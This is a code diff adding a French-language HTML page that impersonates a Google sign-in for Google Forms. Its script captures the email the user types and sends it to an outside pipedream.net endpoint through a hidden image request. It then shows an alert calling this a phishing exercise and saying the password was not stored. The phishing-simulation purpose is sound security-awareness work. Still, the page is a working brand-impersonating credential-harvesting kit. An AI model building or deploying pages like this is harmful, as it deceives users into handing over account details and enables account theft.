@@ -1,1 +1,138 @@
-hello it's work !
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f2f2f2;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 500px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 60px;
+            margin-bottom: 20px;
+            margin-right: 85%;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #333;
+            margin-right: 70%;
+        }
+        h3{
+            margin-right: 70%;
+            font-size: 15px;
+        }
+
+        .input-box {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dcdcdc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285f4;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #357ae8;
+        }
+
+        .other-options {
+            margin-top: 10px;
+        }
+
+        .other-options a {
+            display: block;
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 5px 0;
+        }
+
+        .other-options a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="google.png" alt="Google Logo" class="logo">
+            <h1>Connexion</h1>
+            <h3>Accéder à Forms</h3>
+            <br>
+            <form action="#">
+                <div class="input-box">
+                    <input type="email" id="email" name="email" placeholder="Adresse e-mail" required>
+                </div>
+                <div class="input-box">
+                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+                </div>
+                <button type="submit" class="btn">Se connecter</button>
+                <div class="other-options">
+                    <a href="#">Mot de passe oublié ?</a>
+                    <a href="#">Créer un compte</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            document.querySelector(".btn").addEventListener("click", function (event) {
+                event.preventDefault(); // Empêche l'envoi du formulaire
+                let email = document.getElementById("email").value;
+                let url = "https://eoseaj9sppnvaof.m.pipedream.net?email="+email;
+                let img = new Image();
+                img.src = url;
+
+                alert("Vous venez d'être victime d'une attaque de phishing. Ne partagez pas cette information avec vos collègues afin de garantir la réussite de l'exercice. (Votre mot de passe n'a pas été conservé.)");
+            });
+        });
+    </script>
+</body>
+</html>
